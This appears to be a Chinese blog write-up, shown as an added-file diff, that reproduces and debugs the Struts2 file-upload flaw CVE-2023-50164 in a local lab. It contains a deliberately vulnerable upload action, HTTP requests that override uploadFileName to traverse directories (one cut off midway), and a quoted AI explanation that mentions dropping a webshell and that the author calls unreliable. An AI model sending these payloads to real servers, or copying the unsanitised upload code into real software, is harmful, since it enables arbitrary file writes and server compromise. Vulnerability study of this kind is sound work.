@@ -1,0 +1,936 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>CVE-2023-50164(S2-066)学习 - Twings</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期五, 二月 28日 2025, 4:29 下午
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    4.1k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      20 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>AI真好用吧。</p>
+<p>本来我在用AI搜索CVE-2024-53677，结果反馈出来说这是个历史漏洞的绕过，那就干脆一起复现了。</p>
+<a id="more"></a>
+<hr>
+<h3 id="CVE-2023-50164-S2-066"><a href="#CVE-2023-50164-S2-066" class="headerlink" title="CVE-2023-50164(S2-066)"></a>CVE-2023-50164(S2-066)</h3><h4 id="AI分析"><a href="#AI分析" class="headerlink" title="AI分析"></a>AI分析</h4><p>提出问题1：</p>
+<pre><code>结合struts2的源代码分析CVE-2023-50164文件上传漏洞的原理
+</code></pre><p>AI回答：</p>
+<pre><code>CVE-2023-50164文件上传漏洞的原理与Struts2框架处理文件上传参数时的大小写敏感特性及参数覆盖机制密切相关。以下是结合源码的详细分析：
+
+1. 漏洞触发核心机制
+Struts2在处理文件上传请求时，会通过FileUploadInterceptor拦截请求并解析参数。关键步骤如下：
+
+参数解析：拦截器从请求中提取upload（文件对象）、uploadContentType（文件类型）、uploadfilename（文件名）等参数
+。
+大小写敏感的参数覆盖：Struts2将参数存储在HttpParameters对象中，该对象本质是HashMap。由于Java Bean属性命名规则（如setUploadFileName对应uploadFileName），当请求中同时存在upload（大写U）和uploadfilename（小写u）时，HttpParameters会分别以&quot;upload&quot;和&quot;uploadfilename&quot;为键存储这两个参数
+。
+参数绑定：在Action的setter方法调用过程中，Struts2通过反射机制将参数值绑定到属性上。由于HttpParameters的键是大小写敏感的，&quot;uploadfilename&quot;（小写u）会覆盖&quot;UploadFileName&quot;（大写U），导致攻击者构造的恶意文件名（如../../poc.txt）被最终写入文件系统
+。
+2. 漏洞利用条件
+文件名过滤绕过：Struts2在获取文件名时，通过getCanonicalName()方法过滤了/和\等路径分隔符，但若攻击者通过参数覆盖直接修改uploadfilename的值，可绕过此限制
+。
+环境配置要求：目标服务器需允许上传危险文件后缀（如.jsp），且上传目录具有可写权限，否则即使路径穿越成功也无法执行恶意代码
+</code></pre><p>还给出了漏洞利用方式：</p>
+<pre><code>POST /upload.action
+Content-Type: multipart/form-data
+...
+Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;1.txt&quot;
+...
+Content-Disposition: form-data; name=&quot;uploadfilename&quot;; filename=&quot;../../poc.jsp&quot;
+</code></pre><p>看起来关键点在于HashMap的大小写敏感，和其导致的首字母大小写变体覆盖原有参数，使得原有的文件保存路径被修改，进而造成了目录穿越写入webshell。</p>
+<p>大致上漏洞原理是清晰了，但是问到细节AI还是不太行，还是得自己动手搭建环境和调试漏洞。</p>
+<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><p>首先用IDEA新建一个webapp项目，然后再问问AI怎么搭建这个漏洞的测试环境。</p>
+<p>首先要在maven中添加struts2依赖：</p>
+<pre><code class="xml">&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.struts&lt;/groupId&gt;
+    &lt;artifactId&gt;struts2-core&lt;/artifactId&gt;
+    &lt;version&gt;6.3.0&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>然后编写上传功能，在src/main目录下面新建一个Java源代码目录java，再在里面新建一个java文件UploadAction.java：</p>
+<pre><code class="java">package com.example;
+
+import com.opensymphony.xwork2.ActionSupport;
+import org.apache.commons.io.FileUtils;
+import org.apache.struts2.ServletActionContext;
+
+import java.io.File;
+
+public class UploadAction extends ActionSupport {
+    private File upload;
+    private String uploadFileName;
+
+    // Getter &amp; Setter方法
+    public String doUpload() {
+        String path = ServletActionContext.getServletContext().getRealPath(&quot;/upload&quot;);
+        String realPath = path + File.separator + uploadFileName;
+        try {
+            FileUtils.copyFile(upload, new File(realPath));
+        } catch (Exception e) { e.printStackTrace(); }
+        return SUCCESS;
+    }
+}
+</code></pre>
+<p>遇到问题，这在行代码中：</p>
+<pre><code class="java">String path = ServletActionContext.getServletContext().getRealPath(&quot;/upload&quot;);
+</code></pre>
+<p>IDEA显示找不到ServletContext类/接口的声明，因此找不到getRealPath方法。</p>
+<p>查询资料，找到<a href="https://blog.csdn.net/qq_37665834/article/details/81608280" target="_blank" rel="noopener">解决办法</a>，看起来是需要将Tomcat依赖servlet-api.jar和jsp-api.jar导入项目中，问题解决。</p>
+<p>然后修改web.xml配置filter：</p>
+<pre><code class="xml">&lt;filter&gt;
+    &lt;filter-name&gt;struts2&lt;/filter-name&gt;
+    &lt;filter-class&gt;org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter&lt;/filter-class&gt;
+&lt;/filter&gt;
+&lt;filter-mapping&gt;
+    &lt;filter-name&gt;struts2&lt;/filter-name&gt;
+    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;
+&lt;/filter-mapping&gt;
+</code></pre>
+<p>并在web-inf/classes目录下新建struts.xml：</p>
+<pre><code class="xml">&lt;action name=&quot;upload&quot; class=&quot;com.example.UploadAction&quot; method=&quot;doUpload&quot;&gt;
+    &lt;result name=&quot;success&quot;&gt;/success.jsp&lt;/result&gt;
+&lt;/action&gt;
+</code></pre>
+<p>再编写success.jsp和index.jsp：</p>
+<pre><code class="jsp">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;
+&lt;%@ taglib prefix=&quot;s&quot; uri=&quot;/struts-tags&quot; %&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;文件上传&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h2&gt;上传文件&lt;/h2&gt;
+    &lt;s:form action=&quot;upload.action&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+        &lt;s:file name=&quot;file&quot; label=&quot;选择文件&quot; /&gt;
+        &lt;s:submit value=&quot;上传&quot; /&gt;
+    &lt;/s:form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>遇到问题，/struts-tags标签库无法导入，尝试在web.xml中添加标签库：</p>
+<pre><code class="xml">&lt;taglib&gt;
+  &lt;taglib-uri&gt;/struts-tags&lt;/taglib-uri&gt;
+  &lt;taglib-location&gt;/WEB-INF/lib/*.jar&lt;/taglib-location&gt;
+&lt;/taglib&gt;
+</code></pre>
+<p>还是报错，先不管，打包成war到tomcat下面进行测试，继续报错：</p>
+<pre><code>无法访问javax.servlet.ServletContext
+</code></pre><p>但是我已经在项目结构-库中进行了导入，搜索尝试解决，找到<a href="https://blog.csdn.net/qq_34359754/article/details/111875477" target="_blank" rel="noopener">方案</a>，继续打包，还是错误。</p>
+<p>问一下AI，AI告诉我可以在pom.xml中添加依赖：</p>
+<pre><code class="xml"> &lt;dependency&gt;
+    &lt;groupId&gt;javax.servlet&lt;/groupId&gt;
+    &lt;artifactId&gt;servlet-api&lt;/artifactId&gt;
+    &lt;version&gt;3.1.0&lt;/version&gt; &lt;!-- 根据容器版本选择（如Tomcat 9+需3.1+） --&gt;
+    &lt;scope&gt;provided&lt;/scope&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>报告说仓库里找不到依赖，去仓库搜索一下修改一下依赖名称：</p>
+<pre><code class="xml">&lt;dependency&gt;
+    &lt;groupId&gt;javax.servlet&lt;/groupId&gt;
+    &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt;
+    &lt;version&gt;4.0.1&lt;/version&gt; &lt;!-- 根据容器版本选择（如Tomcat 9+需3.1+） --&gt;
+    &lt;scope&gt;provided&lt;/scope&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>provided代表它只影响到编译、测试阶段。</p>
+<p>在编译测试阶段，我们需要这个artifact对应的jar包在classpath中，而在运行阶段，假定目标的容器（比如我们这里的liferay容器）已经提供了这个jar包，所以无需我们这个artifact对应的jar包了。</p>
+<p>然后执行maven的package命令，这次打包成功了，再配置一下tomcat服务器并允许，遇到错误：</p>
+<pre><code>Unable to load configuration. - file:/D:/Code/struts2-upload/target/struts2-upload/WEB-INF/classes/struts.xml:1:8
+</code></pre><p>应该是struts.xml格式不对，现在写的太简略了，再问问AI模板然后修改一下：</p>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE struts PUBLIC
+        &quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;
+        &quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;&gt;
+
+&lt;struts&gt;
+    &lt;!-- Action 配置 --&gt;
+    &lt;package name=&quot;default&quot; extends=&quot;struts-default&quot;&gt;
+        &lt;action name=&quot;upload&quot; class=&quot;com.example.UploadAction&quot; method=&quot;doUpload&quot;&gt;
+            &lt;result name=&quot;success&quot;&gt;/success.jsp&lt;/result&gt;
+        &lt;/action&gt;
+    &lt;/package&gt;
+&lt;/struts&gt;
+</code></pre>
+<p>问题：</p>
+<pre><code>ERROR ClosingUIBean Could not open template
+</code></pre><p>看起来是标签库还是没有正确导入，问问AI可以修改下JSP文件：</p>
+<pre><code class="jsp">&lt;%@ taglib prefix=&quot;s&quot; uri=&quot;http://struts.apache.org/tags-struts2&quot; %&gt;
+</code></pre>
+<p>但是这个URL资源现在貌似不可使用了，再自己搜索一下修修改改，将struts-core jar包里的struts-tags.tld复制到webapp/META-INF目录下，再修改一下web.xml：</p>
+<pre><code class="xml">&lt;taglib&gt;
+    &lt;taglib-uri&gt;/struts-tags&lt;/taglib-uri&gt;
+    &lt;taglib-location&gt;/META-INF/struts-tags.tld&lt;/taglib-location&gt;
+&lt;/taglib&gt;
+</code></pre>
+<p>问题仍然存在，这下只能自己调试找找原因了，先确定一下标签库导入成功：</p>
+<pre><code class="jsp">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;
+&lt;%@ taglib prefix=&quot;s&quot; uri=&quot;/struts-tags&quot; %&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;文件上传&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h2&gt;上传文件&lt;/h2&gt;
+&lt;s:text name=&quot;text&quot; /&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>s:text标签没有报错，说明标签导入成功。调试最后发现，即使删除tld文件，又删掉web.xml里面的taglib-location，标签库依然能导入成功。</p>
+<p>调试发现报错在getNamespace函数，猜测可能与命名空间相关？在struts-tags标签库里能看到s:form标签存在namespace这个属性，尝试：</p>
+<pre><code class="jsp">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;
+&lt;%@ taglib prefix=&quot;s&quot; uri=&quot;/struts-tags&quot; %&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;文件上传&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;s:form action=&quot;upload&quot; namespace=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+    &lt;s:file name=&quot;upload&quot; label=&quot;选择文件&quot; /&gt;
+    &lt;s:submit value=&quot;上传&quot; /&gt;
+&lt;/s:form&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>同时也修改一下UploadAction，加上setUpload等函数：</p>
+<pre><code class="java">package com.example;
+
+import com.opensymphony.xwork2.ActionSupport;
+import org.apache.commons.io.FileUtils;
+import org.apache.struts2.ServletActionContext;
+
+import java.io.File;
+
+public class UploadAction extends ActionSupport {
+    private String contentType;
+    private File upload;
+    private String uploadFileName;
+
+    public File getUpload() {
+        return upload;
+    }
+
+    public void setUpload(File upload) {
+        this.upload = upload;
+    }
+
+    public String getUploadFileName() {
+        return uploadFileName;
+    }
+
+    public void setUploadFileName(String fileName) {
+        this.uploadFileName = fileName;
+    }
+
+    public String getUploadContentType() {
+        return contentType;
+    }
+
+    public void setUploadContentType(String contentType) {
+        this.contentType = contentType;
+    }
+
+    // Getter &amp; Setter方法
+    public String doUpload() {
+        String path = ServletActionContext.getServletContext().getRealPath(&quot;/upload&quot;);
+        String realPath = path + File.separator + uploadFileName;
+        try {
+            FileUtils.copyFile(upload, new File(realPath));
+        } catch (Exception e) { e.printStackTrace(); }
+        return SUCCESS;
+    }
+}
+</code></pre>
+<p>测试后文件上传成功给，现在可以正常使用了，最后总结，AI答案不是特别靠谱。</p>
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><h5 id="简单尝试"><a href="#简单尝试" class="headerlink" title="简单尝试"></a>简单尝试</h5><p>在这个简单的文件上传功能中，上传文件夹不可控，文件名由uploadFileName决定，uploadFileName和upload文件对象都是通过setter填入UploadAction中的。</p>
+<p>试用一下yakit，由于开启的本地测试环境，本地回环地址127.0.0.1无法直接抓取，需要先修改C:\Windows\System32\drivers\etc\hosts文件，添加自定义域名：</p>
+<pre><code>127.0.0.1     www.test.local 
+</code></pre><p>这样就可以抓到包了：</p>
+<pre><code class="yaml">POST /struts2_upload_war_exploded/upload.action;jsessionid=E88CE6974708C3CF0F165E2AC2C36CC1 HTTP/1.1
+Host: www.test.local:8080
+Cache-Control: max-age=0
+Referer: http://www.test.local:8080/struts2_upload_war_exploded/
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1QfPbi7wUsDuglB1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Upgrade-Insecure-Requests: 1
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+Origin: http://www.test.local:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
+Accept-Encoding: gzip, deflate
+Cookie: JSESSIONID=E88CE6974708C3CF0F165E2AC2C36CC1
+Content-Length: 194
+
+------WebKitFormBoundary1QfPbi7wUsDuglB1
+Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;test.TXT&quot;
+Content-Type: text/plain
+
+flag{test}
+------WebKitFormBoundary1QfPbi7wUsDuglB1--
+</code></pre>
+<p>首先尝试直接修改uploadFileName进行目录穿越：</p>
+<pre><code class="yaml">POST /struts2_upload_war_exploded/upload.action;jsessionid=E88CE6974708C3CF0F165E2AC2C36CC1 HTTP/1.1
+Host: www.test.local:8080
+Cache-Control: max-age=0
+Referer: http://www.test.local:8080/struts2_upload_war_exploded/
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1QfPbi7wUsDuglB1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Upgrade-Insecure-Requests: 1
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+Origin: http://www.test.local:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
+Accept-Encoding: gzip, deflate
+Cookie: JSESSIONID=E88CE6974708C3CF0F165E2AC2C36CC1
+Content-Length: 194
+
+------WebKitFormBoundary1QfPbi7wUsDuglB1
+Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;../test.TXT&quot;
+Content-Type: text/plain
+
+flag{test}
+------WebKitFormBoundary1QfPbi7wUsDuglB1--
+</code></pre>
+<p>发现最后set进来的uploadFileName还是test.TXT，说明目录穿越字符被过滤掉了。</p>
+<h5 id="setter从哪来"><a href="#setter从哪来" class="headerlink" title="setter从哪来"></a>setter从哪来</h5><p>简单调试观察一下，给文件名uploadFileName的setter下个断点，调试可以看到setter由ognl负责寻找和调用，根据调用栈找到OgnlRuntime类的getDeclaredMethods函数：</p>
+<pre><code class="java">String baseName = capitalizeBeanPropertyName(propertyName);
+List var10 = new ArrayList();
+collectAccessors(targetClass, baseName, var10, findSets);
+</code></pre>
+<p>搜索setter的流程主要分为两部分，第一部分是通过capitalizeBeanPropertyName函数获得待set进去的属性名称：</p>
+<pre><code class="java">char first = propertyName.charAt(0);
+char second = propertyName.charAt(1);
+if (Character.isLowerCase(first) &amp;&amp; Character.isUpperCase(second)) {
+    return propertyName;
+} else {
+    char[] chars = propertyName.toCharArray();
+    chars[0] = Character.toUpperCase(chars[0]);
+    return new String(chars);
+}
+</code></pre>
+<p>主要关注这一块代码，如果不是第一个字符小写，第二个字符大写的模式，就会将第一个字符变成大写作为属性名称，因此，将upload和Upload传入capitalizeBeanPropertyName函数的结果是一样的。</p>
+<p>再通过collectAccessors函数获得setter：</p>
+<pre><code class="java">Method[] methods;
+try {
+    methods = c.getDeclaredMethods();
+} catch (SecurityException var10) {
+    methods = c.getMethods();
+}
+
+for(int i = 0; i &lt; methods.length; ++i) {
+    if (c.isInterface()) {
+        if (isDefaultMethod(methods[i]) || isNonDefaultPublicInterfaceMethod(methods[i])) {
+            addIfAccessor(result, methods[i], baseName, findSets);
+        }
+    } else if (isMethodCallable(methods[i])) {
+        addIfAccessor(result, methods[i], baseName, findSets);
+    }
+}
+</code></pre>
+<p>获取所有函数，再通过addIfAccessor函数进行函数和属性名称的校验，后续还有从superclass和interface搜索的，这里暂且不提：</p>
+<pre><code class="java">String ms = method.getName();
+if (ms.endsWith(baseName)) {
+    boolean isSet = false;
+    boolean isIs = false;
+    if ((isSet = ms.startsWith(&quot;set&quot;)) || ms.startsWith(&quot;get&quot;) || (isIs = ms.startsWith(&quot;is&quot;))) {
+        int prefixLength = isIs ? 2 : 3;
+        if (isSet == findSets &amp;&amp; baseName.length() == ms.length() - prefixLength) {
+            result.add(method);
+        }
+    }
+}
+</code></pre>
+<p>到这里就是简单的字符串匹配了，以capitalizeBeanPropertyName函数修改后的属性名称(Upload)结尾的setter、getter和is函数就会被添加到result这个List中。</p>
+<p>总结起来就是，upload和Upload都会调用到setUpload函数：</p>
+<pre><code class="yaml">POST /struts2_upload_war_exploded/upload.action?upload=twings.jar HTTP/1.1
+Host: www.test.local:8080
+Cache-Control: max-age=0
+Referer: http://www.test.local:8080/struts2_upload_war_exploded/
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1QfPbi7wUsDuglB1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Upgrade-Insecure-Requests: 1
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+Origin: http://www.test.local:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
+Accept-Encoding: gzip, deflate
+Cookie: JSESSIONID=E88CE6974708C3CF0F165E2AC2C36CC1
+Content-Length: 194
+
+------WebKitFormBoundary1QfPbi7wUsDuglB1
+Content-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;../test.TXT&quot;
+Content-Type: text/plain
+
+flag{test}
+------WebKitFormBoundary1QfPbi7wUsDuglB1--
+</code></pre>
+<p>不过第二次类型不对set进去是个null，目前来看调用顺序是先大写后小写。</p>
+<h5 id="setter的调用顺序"><a href="#setter的调用顺序" class="headerlink" title="setter的调用顺序"></a>setter的调用顺序</h5><p>继续翻调用栈，找到ParametersInterceptor类的doIntercept函数：</p>
+<pre><code class="Java">Object action = invocation.getAction();
+if (!(action instanceof NoParameters)) {
+    ActionContext ac = invocation.getInvocationContext();
+    HttpParameters parameters = retrieveParameters(ac);
+
+    if (LOG.isDebugEnabled()) {
+        LOG.debug(&quot;Setting params {}&quot;, getParameterLogMap(parameters));
+    }
+
+    if (parameters != null) {
+        Map&lt;String, Object&gt; contextMap = ac.getContextMap();
+        try {
+            ReflectionContextState.setCreatingNullObjects(contextMap, true);
+            ReflectionContextState.setDenyMethodExecution(contextMap, true);
+            ReflectionContextState.setReportingConversionErrors(contextMap, true);
+
+            ValueStack stack = ac.getValueStack();
+            setParameters(action, stack, parameters);
+        } finally {
+            ReflectionContextState.setCreatingNullObjects(contextMap, false);
+            ReflectionContextState.setDenyMethodExecution(contextMap, false);
+            ReflectionContextState.setReportingConversionErrors(contextMap, false);
+        }
+    }
+}
+return invocation.invoke();
+</code></pre>
+<p>HTTP传递的待绑定属性都存放在一个HttpParameters对象中，再通过setParameters函数遍历：</p>
+<pre><code class="java">HttpParameters params;
+Map&lt;String, Parameter&gt; acceptableParameters;
+if (ordered) {
+    params = HttpParameters.create().withComparator(getOrderedComparator()).withParent(parameters).build();
+    acceptableParameters = new TreeMap&lt;&gt;(getOrderedComparator());
+} else {
+    params = HttpParameters.create().withParent(parameters).build();
+    acceptableParameters = new TreeMap&lt;&gt;();
+}
+
+for (Map.Entry&lt;String, Parameter&gt; entry : params.entrySet()) {
+    String parameterName = entry.getKey();
+    boolean isAcceptableParameter = isAcceptableParameter(parameterName, action);
+    isAcceptableParameter &amp;= isAcceptableParameterValue(entry.getValue(), action);
+
+    if (isAcceptableParameter) {
+        acceptableParameters.put(parameterName, entry.getValue());
+    }
+}
+</code></pre>
+<p>调试得知HttpParameters使用的是HashMap，而遍历之后存放属性的acceptableParameters使用的是TreeMap，最后也是遍历acceptableParameters进行set：</p>
+<pre><code class="java">for (Map.Entry&lt;String, Parameter&gt; entry : acceptableParameters.entrySet()) {
+    String name = entry.getKey();
+    Parameter value = entry.getValue();
+    try {
+        newStack.setParameter(name, value.getObject());
+    } catch (RuntimeException e) {
+        if (devMode) {
+            notifyDeveloperParameterException(action, name, e.getMessage());
+        }
+    }
+}
+</code></pre>
+<p>而TreeMap在生成时由于没有设置Comparator，因此会使用默认顺序，即按键的自然顺序（升序）排列，所以小写upload会覆盖掉大写Upload的值，uploadFileName会覆盖掉UploadFileName的值。</p>
+<h5 id="uploadFileName从哪来"><a href="#uploadFileName从哪来" class="headerlink" title="uploadFileName从哪来"></a>uploadFileName从哪来</h5><p>为什么直接在POST体filename修改的../会被删掉，根据调试找到FileUploadInterceptor类的intercept函数，其中文件名的获得方法为：</p>
+<pre><code class="java">String[] fileName = multiWrapper.getFileNames(inputName);
+</code></pre>
+<p>getFileNames函数来自JakartaMultiPartRequest类：</p>
+<pre><code class="java">public String[] getFileNames(String fieldName) {
+    List&lt;FileItem&gt; items = files.get(fieldName);
+
+    if (items == null) {
+        return null;
+    }
+
+    List&lt;String&gt; fileNames = new ArrayList&lt;&gt;(items.size());
+    for (FileItem fileItem : items) {
+        fileNames.add(getCanonicalName(fileItem.getName()));
+    }
+
+    return fileNames.toArray(new String[fileNames.size()]);
+}
+</code></pre>
+<p>getCanonicalName函数对目录穿越字符进行了一次清洗：</p>
+<pre><code class="Java">protected String getCanonicalName(final String originalFileName) {
+    String fileName = originalFileName;
+
+    int forwardSlash = fileName.lastIndexOf(&#39;/&#39;);
+    int backwardSlash = fileName.lastIndexOf(&#39;\\&#39;);
+    if (forwardSlash != -1 &amp;&amp; forwardSlash &gt; backwardSlash) {
+        fileName = fileName.substring(forwardSlash + 1);
+    } else {
+        fileName = fileName.substring(backwardSlash + 1);
+    }
+    return fileName;
+}
+</code></pre>
+<p>最后一起塞进了HttpParameters里等待后续set：</p>
+<pre><code class="java">String contentTypeName = inputName + &quot;ContentType&quot;;
+String fileNameName = inputName + &quot;FileName&quot;; // UploadFileName
+...
+if (!acceptedFiles.isEmpty()) {
+    Map&lt;String, Parameter&gt; newParams = new HashMap&lt;&gt;();
+    newParams.put(inputName, new Parameter.File(inputName, acceptedFiles.toArray(new UploadedFile[acceptedFiles.size()])));
+    newParams.put(contentTypeName, new Parameter.File(contentTypeName, acceptedContentTypes.toArray(new String[acceptedContentTypes.size()])));
+    newParams.put(fileNameName, new Parameter.File(fileNameName, acceptedFileNames.toArray(new String[acceptedFileNames.size()])));
+    ac.getParameters().appendAll(newParams);
+}
+</code></pre>
+<p>由于输入的name为Upload，所以最后用于存储文件名的键为UploadFileName，因此可以使用小写uploadFileName进行覆盖。</p>
+<p>至此，整个漏洞流程已经差不多清晰了。</p>
+<h5 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h5><p>payload：</p>
+<pre><code class="yaml">POST /struts2_upload_war_exploded/upload.action?uploadFileName=../twings.jar HTTP/1.1
+Host: www.test.local:8080
+Cache-Control: max-age=0
+Referer: http://www.test.local:8080/struts2_upload_war_exploded/
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary1QfPbi7wUsDuglB1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Upgrade-Insecure-Requests: 1
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+Origin: http://www.test.local:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
+Accept-Encoding: gzip, deflate
